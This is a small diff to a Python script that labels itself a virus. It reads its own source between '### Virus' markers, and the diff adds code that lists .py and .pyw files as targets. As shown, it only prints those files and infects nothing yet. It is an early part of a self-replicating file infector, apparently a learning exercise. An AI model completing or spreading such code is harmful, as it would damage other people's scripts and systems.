@@ -6,6 +6,7 @@ import sys, glob
 code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
+
 ### Finding the code of Virus area"
 virus_area = False
 for line in lines:
@@ -16,4 +17,8 @@ for line in lines:
     if line == '### End of Virus ###\n':
         break
 
+# ## Finding python scripts  by extensions ('.pyw' is the extension for python scripts that run withour a visible
+# window) ###
+python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
+print(python_scripts)
 ### End of Virus ###
